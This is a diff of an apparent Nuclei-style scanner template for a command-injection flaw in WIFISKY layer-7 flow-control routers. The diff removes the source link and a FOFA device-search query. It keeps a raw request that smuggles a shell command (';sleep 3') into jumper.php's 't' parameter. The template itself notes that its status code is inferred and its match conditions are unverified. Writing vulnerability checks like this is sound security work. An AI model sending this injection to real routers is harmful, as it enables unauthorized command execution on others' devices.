@@ -3,14 +3,8 @@ info:
   name: WIFISKY7层流控路由器jumper存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ab9761ba109bb92879832896fd4bdd0f
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ab9761ba109bb92879832896fd4bdd0f
-    fofa: + fofa`title="WIFISKY 7层流控路由器"`
 http:
 - raw:
   - 'GET /notice/jumper.php?t=;sleep%203 HTTP/1.1
